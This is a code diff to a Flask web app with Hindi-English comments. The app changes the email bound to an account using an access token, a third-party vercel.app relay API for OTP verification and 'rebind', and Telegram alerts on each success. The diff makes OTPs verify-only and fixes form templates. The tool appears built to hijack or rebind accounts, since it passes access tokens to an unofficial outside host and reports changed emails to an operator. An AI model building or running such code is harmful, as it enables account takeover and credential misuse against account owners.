@@ -167,8 +167,61 @@ def create_rebind(access, email, identity_token, verifier_token):
     except:
         return False, "Error"
 
-# ============ FIX #1 SIRF YEH FUNCTION CHANGE KIYA ============
+# ============ FIXED: Yeh function ab OTPs dobara nahi bhejta, sirf verify karta hai ============
+def change_email_no_sec_final(access, cur_email, new_email, otp1, otp2):
+    """
+    FIX: Yeh function SIRF verify karta hai, OTPs dobara nahi bhejta.
+    OTPs already Step 1 aur Step 2 mein bheje ja chuke hain.
+    """
+    try:
+        # Step 1: Verify OTP for current email (verify only, NO re-send)
+        url2 = "https://chngeforgotcrownx72.vercel.app/verify"
+        rsp2 = requests.get(url2, params={'access_token': access, 'current_email': cur_email, 'otp': otp1}, timeout=10)
+        if not is_success(rsp2):
+            return False, "Invalid or expired OTP for current email"
+        
+        identity = rsp2.json().get("identity_token") or rsp2.json().get("data", {}).get("identity_token")
+        if not identity:
+            return False, "Failed to get identity token"
+        
+        # Step 2: Verify OTP for new email (verify only, NO re-send)
+        url4 = "https://chngeforgotcrownx72.vercel.app/newverify"
+        rsp4 = requests.get(url4, params={'access_token': access, 'new_email': new_email, 'otp': otp2}, timeout=10)
+        if not is_success(rsp4):
+            return False, "Invalid or expired OTP for new email"
+        
+        verifier = rsp4.json().get("verifier_token") or rsp4.json().get("data", {}).get("verifier_token")
+        if not verifier:
+            return False, "Failed to get verifier token"
+        
+        # Step 3: Execute the change
+        url5 = "https://chngeforgotcrownx72.vercel.app/change"
+        rsp5 = requests.get(url5, params={
+            'access_token': access,
+            'new_email': new_email,
+            'identity_token': identity,
+            'verifier_token': verifier
+        }, timeout=10)
+        if is_success(rsp5):
+            return True, "Email changed successfully!"
+        
+        # Agar fail ho toh response ka error message lena
+        try:
+            err_detail = rsp5.json()
+            err_msg = err_detail.get('error') or err_detail.get('message') or 'Unknown error'
+            # Agar data key mein error ho
+            if isinstance(err_detail.get('data'), dict):
+                err_msg = err_detail['data'].get('error', err_msg)
+            return False, f"Failed: {err_msg}"
+        except:
+            return False, "Failed to change email"
+    except Exception as e:
+        return False, f"Error: {str(e)}"
+
+
+# ============ OLD function ko rahne do but use nahi karenge ============
 def change_email_no_sec(access, cur_email, new_email, otp1, otp2):
+    """OLD - DO NOT USE. Use change_email_no_sec_final instead."""
     try:
         url1 = "https://chngeforgotcrownx72.vercel.app/otp"
         rsp1 = requests.get(url1, params={'access_token': access, 'current_email': cur_email}, timeout=10)
@@ -482,7 +535,7 @@ CHECK_HTML = f"""<!DOCTYPE html>
 <a href="/dashboard" class="back-link">← BACK</a>
 </div></div></body></html>"""
 
-# ============ CHANGE EMAIL WITH SEC (ORIGINAL WALA - PERFECT KAAM KARTA THA) ============
+# ============ CHANGE EMAIL WITH SEC (SECURITY CODE WALA - FIXED) ============
 @app.route('/change-email-sec', methods=['GET', 'POST'])
 def change_email_sec_route():
     if 'user_id' not in session:
@@ -568,12 +621,13 @@ def change_email_sec_otp_route():
             error="Invalid OTP for new email!"
         )
     
+    # FIX: verify_identity dobara karte hain kyunki yeh stateless API hai
     ok, identity = verify_identity(access, sec_code)
     if not ok:
         return render_template_string(CES_OTP_HTML,
             access_token=access, current_email=current_email,
             new_email=new_email, sec_code=sec_code,
-            error="Security code verification failed!"
+            error="Security code verification failed! Please start again."
         )
     
     done, msg = create_rebind(access, new_email, identity, verifier)
@@ -590,7 +644,7 @@ def change_email_sec_otp_route():
         error=msg
     )
 
-# ============ FIXED: CHANGE EMAIL WITH OTP ============
+# ============ FIXED: CHANGE EMAIL WITH OTP (AB OTPS DOBARA NAHI BHEJTA) ============
 @app.route('/change-email-otp', methods=['GET', 'POST'])
 def change_email_otp_route():
     if 'user_id' not in session:
@@ -607,7 +661,6 @@ def change_email_otp_route():
             ok, _ = send_otp(access, current_email, "current")
             if not ok:
                 return render_template_string(CEO_HTML, step=1, error="Failed to send OTP to current email!")
-            # Step 2 - access_token aur current_email pass karo
             return render_template_string(CEO_STEP2_HTML, 
                 access_token=access, 
                 current_email=current_email
@@ -649,19 +702,20 @@ def change_email_otp_route():
             otp2 = request.form.get('otp2')
             otp1 = request.form.get('otp1')
             if not all([access, current_email, new_email, otp2, otp1]):
-                return render_template_string(CEO_HTML, step=3,
+                return render_template_string(CEO_STEP3_HTML,
                     error="All fields required!",
-                    access_token=access, current_email=current_email, new_email=new_email
+                    access_token=access, current_email=current_email, new_email=new_email,
+                    otp1=otp1, step=3
                 )
-            # FIX #2: YAHAN ACTUAL OTPs PASS HO RAHE HAIN - "123456" NAHI
-            success, msg = change_email_no_sec(access, current_email, new_email, otp1, otp2)
+            # FIX: change_email_no_sec_final ab OTPs dobara nahi bhejega
+            success, msg = change_email_no_sec_final(access, current_email, new_email, otp1, otp2)
             if success:
                 send_to_telegram(f"✅ <b>EMAIL CHANGED (OTP)</b>\n\nNew Email: {new_email}")
-                return render_template_string(CEO_HTML, success=msg)
+                return render_template_string(CEO_HTML, success=msg, step=1)
             return render_template_string(CEO_STEP3_HTML,
                 error=msg,
                 access_token=access, current_email=current_email, 
-                new_email=new_email, otp1=otp1
+                new_email=new_email, otp1=otp1, step=3
             )
     
     return render_template_string(CEO_HTML, step=1)
@@ -708,8 +762,8 @@ CEO_STEP3_HTML = f"""<!DOCTYPE html>
 <body><div style="width:100%;max-width:500px;padding:20px"><div class="card">
 <h1>CHANGE MAIL (WITH OTP)</h1>
 {{% if error %}}<div class="error">{{{{ error }}}}</div>{{% endif %}}
-<div style="text-align:center;color:#ff000066;font-size:11px;margin-bottom:20px">STEP 3 OF 3 - VERIFY NEW EMAIL</div>
-<p style="color:#00ff0088;text-align:center;font-size:12px;margin-bottom:20px">✓ OTP sent to {{{{ new_email }}}}</p>
+<div style="text-align:center;color:#ff000066;font-size:11px;margin-bottom:20px">STEP 3 OF 3 - FINAL VERIFICATION</div>
+<p style="color:#00ff0088;text-align:center;font-size:12px;margin-bottom:20px">✓ Enter OTP sent to {{{{ new_email }}}}</p>
 <form method="POST" action="/change-email-otp">
 <div class="input-group"><label>OTP CODE (NEW EMAIL)</label><input type="text" name="otp2" placeholder="Enter OTP from New Email" required></div>
 <button type="submit" class="btn">CONFIRM & CHANGE</button>
